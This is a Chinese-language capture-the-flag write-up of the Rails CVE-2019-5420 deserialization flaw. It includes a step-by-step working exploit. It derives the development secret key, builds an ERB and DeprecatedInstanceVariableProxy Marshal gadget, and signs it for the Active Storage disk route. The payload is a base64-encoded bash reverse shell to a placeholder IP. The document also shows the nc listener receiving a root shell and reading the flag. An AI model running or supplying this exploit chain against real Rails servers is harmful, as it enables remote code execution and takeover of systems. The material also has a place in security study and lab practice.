# ruby 反序列化 （CVE-2019-5420）



```
https://github.com/PenTestical/CVE-2019-5420
```





参考：

```
[1] Ruby on Rails 命令执行漏洞payload实现过程
https://hackerone.com/reports/473888
```

Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.

```RUBY
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110
    def initialize(secret, options = {})
      raise ArgumentError, "Secret should not be nil." unless secret
      @secret = secret
      @digest = options[:digest] || "SHA1"
      @serializer = options[:serializer] || Marshal
    end
```



```RUBY
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || self.class.default_cipher
  @digest = options[:digest] || "SHA1" unless aead_mode?
  @verifier = resolve_verifier
  @serializer = options[:serializer] || Marshal
end
```

Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.

```RUBY
# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81
initializer "active_storage.verifier" do
  config.after_initialize do |app|
    ActiveStorage.verifier = app.message_verifier("ActiveStorage")
  end
end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38
def decode_verified_key
  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)
end
```

It is also used in `ActiveStorage::Blob.find_signed`. Also, these URLs can be accessed without using Active Storage.



### PoC

\1. Prepare server 准备服务器。注意，需要ruby, rails使用相应的版本。

```ruby
$ ruby -v
ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]

$ rails -v
Rails 5.2.2

$ rails new verifier_rce
$ cd verifier_rce/
$ bundle install
```

 可以看到  `active_storage` 是有效的。我们在exploit时，可以利用 `/rails/active_storage/disk/` 这个路由。

```ruby
# Active Storage is not installed, but routes is usable
$ bin/rails routes
Prefix Verb URI Pattern                                                                              Controller#Action
rails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
rails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
rails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
update_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
rails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
```



\2. 准备攻击payload。

（1）下载 该容器环境。`knqyf263/cve-2019-5420`

```bash
$ docker run --name cve-2019-5420 --rm -p 3000:3000 knqyf263/cve-2019-5420
$ docker exec -it cve-2019-5420 /bin/bash

```

（2）制作payload。

```
反连服务器IP： XXX.XXX.XXX.XXX
反连服务器端口： XXXX

【1】bash 反连命令： bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0>& 1

【2】-->(Base64.encode): YmFzaCAtaSA+XXXX

【3】irb命令：
code: system('`echo YmFzaCAtaSA+XXXX | base64 -d | bash -i`')

【4】制作为http get中的url载荷：

```



```bash
#进入容器环境中
root@cf0577a0cda5:/verifier_rce# bundle exec rails console
Running via Spring preloader in process 66998
Loading development environment (Rails 5.2.2)

irb(main):001:0> app_class_name = VerifierRce::Application.name
=> "VerifierRce::Application"

irb(main):002:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
=> "7e485df67863e85e584b3feecb22276d"

irb(main):003:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
=> #<ActiveSupport::CachingKeyGenerator:0x0000561192a31f48 @key_generator=#<ActiveSupport::KeyGenerator:0x0000561192a31f98 @secret="7e485df67863e85e584b3feecb22276d", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x0000561192a31f20 entries=0 default_proc=nil>>

irb(main):004:0> secret = key_generator.generate_key("ActiveStorage")
=> "\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,"

irb(main):005:0> verifier = ActiveSupport::MessageVerifier.new(secret)
=> #<ActiveSupport::MessageVerifier:0x0000561192a6c8c8 @secret="\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,", @digest="SHA1", @serializer=Marshal, @options={}, @rotations=[]>

irb(main):012:0> code = '`echo YmFzaCAtaSA+XXXX | base64 -d | bash -i`'
=> "`echo YmFzaCAtaSA+XXXX | base64 -d | bash -i`"

irb(main):013:0> erb = ERB.allocate
=> #<ERB:0x0000561192b15e78>

irb(main):014:0> erb.instance_variable_set :@src, code
=> "`echo YmFzaCAtaSA+XXXXX | base64 -d | bash -i`"

irb(main):015:0> erb.instance_variable_set :@filename, "1"
=> "1"

irb(main):016:0> erb.instance_variable_set :@lineno, 1
=> 1

irb(main):017:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
base64: invalid input
# 以下会自动在容器中执行这条命令。 我们不用执行，直接Ctrl+C退出执行即可。
bash: cannot set terminal process group (211): Inappropriate ioctl for device 
bash: no job control in this shell
root@cf0577a0cda5:/verifier_rce# bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0>& 1
root@cf0577a0cda5:/verifier_rce# exit
^CTraceback (most recent call last):

irb(main):019:0> verifier.generate(dump_target, purpose: :blob_key)
=> "eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSklseGdaV05vYnlCWmJVWjZZVU5CZEdGVFFTdEthVUYyV2tkV01rd3pVbXBqUXpoNFRVUkZkVTE2VVhWT1ZFVjFUbnByZGs1VVZURk9VMEYzVUdsWlowMVJJSHdnWW1GelpUWTBJQzFrSUh3Z1ltRnphQ0F0YVdBR09nWkZSam9PUUdacGJHVnVZVzFsU1NJR01RWTdDVVk2REVCc2FXNWxibTlwQmpvTVFHMWxkR2h2WkRvTGNtVnpkV3gwT2dsQWRtRnlTU0lNUUhKbGMzVnNkQVk3Q1ZRNkVFQmtaWEJ5WldOaGRHOXlTWFU2SDBGamRHbDJaVk4xY0hCdmNuUTZPa1JsY0hKbFkyRjBhVzl1QUFZN0NWUT0iLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--3ef2b8bf66ead4e04e9a98f8c6e31d562fccfb86"
irb(main):020:0> root@cf0577a0cda5:/verifier_rce# exit


```



\3. 攻击

在反弹服务器 `XXX.XXX.XXX.XXX` 上侦听端口 `XXXX`；

```BASH
[root@VM-0-4-centos ~]#  nc -lvvp 5555
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555

```



访问URL即可。

```HTTP
http://123.58.224.8:XXXXX/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSklseGdaV05vYnlCWmJVWjZZVU5CZEdGVFFTdEthVUYyV2tkV01rd3pVbXBqUXpoNFRVUkZkVTE2VVhWT1ZFVjFUbnByZGs1VVZURk9VMEYzVUdsWlowMVJJSHdnWW1GelpUWTBJQzFrSUh3Z1ltRnphQ0F0YVdBR09nWkZSam9PUUdacGJHVnVZVzFsU1NJR01RWTdDVVk2REVCc2FXNWxibTlwQmpvTVFHMWxkR2h2WkRvTGNtVnpkV3gwT2dsQWRtRnlTU0lNUUhKbGMzVnNkQVk3Q1ZRNkVFQmtaWEJ5WldOaGRHOXlTWFU2SDBGamRHbDJaVk4xY0hCdmNuUTZPa1JsY0hKbFkyRjBhVzl1QUFZN0NWUT0iLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--3ef2b8bf66ead4e04e9a98f8c6e31d562fccfb86/test
```

成功获得回连的shell

```BASH
[root@VM-0-4-centos ~]#  nc -lvvp 5555
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 123.58.224.9.
Ncat: Connection from 123.58.224.9:57890.
root@7c4e67a7ccea:/verifier_rce# ls /tmp
ls /tmp
flag-{bmh0b061f25-XXXX-XXXX-XXXX-3d351bd066fe}

```

